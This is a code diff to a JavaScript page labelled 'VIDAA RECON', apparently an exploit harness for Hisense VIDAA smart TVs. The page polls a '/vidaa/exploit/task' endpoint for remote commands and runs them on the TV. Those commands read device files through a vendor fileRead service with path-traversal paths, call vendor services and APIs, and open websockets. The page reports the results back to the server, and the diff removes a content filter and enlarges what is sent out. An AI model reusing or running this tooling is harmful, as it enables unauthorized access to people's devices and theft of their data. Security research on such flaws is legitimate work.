@@ -26,7 +26,12 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
             url: location.href, get_reach: {}, ws_start: [], http_svc: {},
             native: {}, fileread_variant: null, reads: {}, services: {},
             bridge_globals: {}, hisense_fns: null, errors: [] };
-  function det(s) { var d = document.getElementById("det"); d.innerHTML += s + "<br>"; window.scrollTo(0, 1e9); }
+  function det(s) {
+    var d = document.getElementById("det");
+    d.innerHTML += s + "<br>";
+    while (d.children.length > 80) d.removeChild(d.children[0]);
+    window.scrollTo(0, 1e9);
+  }
   function st(s) { document.getElementById("st").textContent = s; }
   function js(v) { try { return JSON.stringify(v).slice(0, 400); } catch (e) { return String(v).slice(0, 400); } }
 
@@ -41,6 +46,7 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
                       "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json",
                       "../var/run/superwatch_socket", "../var/local", "../OAD/AppUpgradeSwitch.json"];
   var goodBase = null;
+  var BUILD = "r7";
   var SELF_SHA = null;
   function djb2(s) { var h = 5381; for (var i = 0; i < s.length; i++) { h = ((h * 33) + s.charCodeAt(i)) >>> 0; } return h.toString(16).padStart(8, "0"); }
   function captureSelf() {
@@ -67,7 +73,12 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
   }
   function isOk(r) { return !!(r && r.ret === true); }
   function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
-  function clip(v, n) { var s = (typeof v === "string") ? v : js(v); return s.slice(0, n || 4000); }
+  function clip(v, n) {
+    var s;
+    if (typeof v === "string") s = v;
+    else { try { s = JSON.stringify(v); } catch (e) { s = String(v); } }
+    return s.slice(0, n || 4000);
+  }
 
   function getReach(base) {
     return fetch(base + "/", { mode: "no-cors" }).then(function (r) {
@@ -195,23 +206,55 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
   }
 
   /* ---------- task interpreter (fixed ops; server mirrors this allowlist) ---------- */
-  async function execOp(op) {
+  function opBrief(op) {
+    if (!op) return "?";
+    if (op.op === "fileRead") return "fileRead " + op.path;
+    if (op.op === "svc") return "svc " + op.svc + "." + op.api;
+    if (op.op === "jsapi") return "jsapi " + op.fn + "(" + clip(op.args || [], 60) + ")";
+    if (op.op === "native") return "native " + op.api;
+    if (op.op === "ws") return "ws " + op.target + " x" + ((op.messages || []).length);
+    if (op.op === "globals") return "globals [" + (op.names || []).join(",") + "]";
+    if (op.op === "enumerate") return "enumerate /" + op.filter + "/i";
+    if (op.op === "sleep") return "sleep " + op.ms + "ms";
+    if (op.op === "batch") return "batch x" + (op.ops || []).length;
+    return op.op;
+  }
+  function resBrief(op, r) {
+    if (!r) return "no result";
+    if (r.rejected || r.missing || r.exc || r.http || r.badRegex) return "FAIL " + clip(r, 120);
+    if (op.op === "fileRead" || op.op === "svc") return (r.ok ? "ok " : "ERR ") + clip(r.content, 120);
+    if (op.op === "jsapi" || op.op === "native") return (r.ret !== undefined || r.ret === true || r.msg !== undefined ? "ok " : "ERR ") + clip(r.ret !== undefined ? r.ret : r.msg, 120);
+    if (op.op === "enumerate") return "count=" + r.count + " " + clip((r.names || []).slice(0, 6), 120);
+    if (op.op === "globals") return "ok";
+    if (op.op === "ws") return "opened=" + r.opened + " frames=" + (r.frames || []).length;
+    if (op.op === "sleep") return "slept";
+    if (op.op === "batch") return "ran " + (r.results || []).length + " ops";
+    return clip(r, 120);
+  }
+  async function execOp(op, live) {
+    if (live === undefined) live = true;
+    if (live) det("> " + opBrief(op));
     if (op.op === "sleep") { await sleep(Math.min(op.ms || 0, 10000)); return { slept: op.ms }; }
     if (op.op === "batch") {
       var out = [];
-      for (var i = 0; i < (op.ops || []).length && i < 20; i++) out.push(await execOp(op.ops[i]));
+      for (var i = 0; i < (op.ops || []).length && i < 20; i++) {
+        var sub = await execOp(op.ops[i], live);
+        out.push(sub);
+        if (live) det("  [" + (i + 1) + "/" + (op.ops || []).length + "] " + opBrief(op.ops[i]) +
+                      " -> " + resBrief(op.ops[i], sub));
+      }
       return { results: out };
     }
     if (op.op === "fileRead") {
       var base = op.base || goodBase || BASES[0];
       var pathVal = op.array === false ? op.path : [op.path];
       var res = parseVendor(await httpCall(base, "hiutils", "fileRead", { mode: op.mode || 6, path: pathVal }, 6000));
-      return { ok: isOk(res), path: op.path, content: clip(res && res.msg !== undefined ? filterContent(op.path, res.msg) : res, 6000) };
+      return { ok: isOk(res), path: op.path, content: clip(res && res.msg !== undefined ? res.msg : res, 30000) };
     }
     if (op.op === "svc") {
       var base2 = op.base || goodBase || BASES[0];
       var r2 = parseVendor(await httpCall(base2, op.svc, op.api, op.args, 6000));
-      return { ok: isOk(r2), content: clip(r2 && r2.msg !== undefined ? r2.msg : r2, 6000) };
+      return { ok: isOk(r2), content: clip(r2 && r2.msg !== undefined ? r2.msg : r2, 30000) };
     }
     if (op.op === "jsapi") {
       if (!/^(?:Hisense_Get|His_get)[A-Za-z0-9_]{0,60}$/.test(op.fn || "")) return { rejected: "jsapi getter-only" };
@@ -253,7 +296,7 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
 
   async function taskLoop() {
     var seen = 0;
-    st("VIDAA RECON v4: idle (rev " + seen + ") - waiting for commands");
+    st("VIDAA RECON " + BUILD + ": idle | rev 0 | waiting for commands");
     for (;;) {
       try {
         var r = await fetch("/vidaa/exploit/task?seen=" + seen, { method: "GET" });
@@ -265,11 +308,14 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
         }
         if (j && j.task && j.rev > seen) {
           seen = j.rev;
-          st("VIDAA RECON v4: running task rev=" + seen + " op=" + (j.task.op || "?"));
+          det("");
+          st("TASK rev " + seen + ": " + opBrief(j.task) + " ...");
           var t0 = Date.now();
           var result = await execOp(j.task);
-          st("VIDAA RECON v4: task rev=" + seen + " done (" + (Date.now() - t0) + "ms) - back to waiting");
-          var cmdReport = { phase: "cmd", rev: seen, t: new Date().toISOString(), ua: navigator.userAgent,
+          var tms = Date.now() - t0;
+          det("= done " + opBrief(j.task) + " in " + tms + "ms");
+          st("idle | rev " + seen + " | last: " + opBrief(j.task) + " (" + tms + "ms) | waiting for commands");
+          var cmdReport = { phase: "cmd", build: BUILD, rev: seen, t: new Date().toISOString(), ua: navigator.userAgent,
                             url: location.href, cmd: { rev: seen, op: j.task.op || "batch",
                             args: clip(j.task, 500), ms: Date.now() - t0 },
                             result: result, reads: {}, errors: [] };
@@ -284,6 +330,7 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
 
   async function run() {
     st("VIDAA RECON v4: running...");
+    R.build = BUILD;
     await captureSelf();
     probeGlobals();
     det("native uptime lane: " + (R.native.uptime && R.native.uptime.ret ? "WORKS" : "no/blocked"));
